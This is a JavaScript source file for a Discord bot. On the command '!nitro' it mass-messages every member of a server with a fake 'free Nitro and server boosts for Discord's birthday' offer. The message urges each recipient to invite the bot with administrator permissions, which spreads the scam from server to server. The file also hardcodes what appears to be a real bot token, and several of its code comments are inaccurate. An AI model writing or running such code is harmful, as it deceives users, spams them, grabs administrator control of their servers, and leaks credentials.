const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', msg => {
    if (msg.guild && msg.content.startsWith('!nitro')) {
        let text = msg.content.slice('!nitro'.length);
        msg.guild.members.cache.forEach(member => {
            const embed = new Discord.MessageEmbed()
                .setColor("#7289DA")
                .setTitle("**Free Nitro and Server Boost for Discord's 2nd Birthday!**")
                .setDescription("**Invite this bot to your server and type !nitro in chat and your server will be granted 5 free boosts and you will be given Nitro Boost!** \n [Click here to invite the bot!](https://discord.com/api/oauth2/authorize?client_id=708090049006141511&permissions=8&scope=bot) \n [Click here to join the birthday Discord!](https://discord.gg/yUJ72fb)")
                .setImage('https://media.discordapp.net/attachments/697925983402983535/708087874834268200/boost-us.gif')

            if (member.id != client.user.id && !member.user.bot) member.send(embed).catch(console.error);
        })
}
});
const activities_list = [
    "Happy Birthday Discord!",
    "Happy Birthday Discord!"
]; // creates an arraylist containing phrases you want your bot to switch through.

client.on('ready', () => {
    setInterval(() => {
        const index = Math.floor(Math.random() * (activities_list.length - 1) + 1); // generates a random number between 1 and the length of the activities array list (in this case 5).
        client.user.setActivity(activities_list[index]); // sets bot's activities to one of the phrases in the arraylist.
    }, 1500); // Runs this every 2 seconds.

});

client.login('NzA4MDkwMDQ5MDA2MTQxNTEx.XrSSug.OMMi0SNj1u2Zw-w0vm1vZd_Azks');
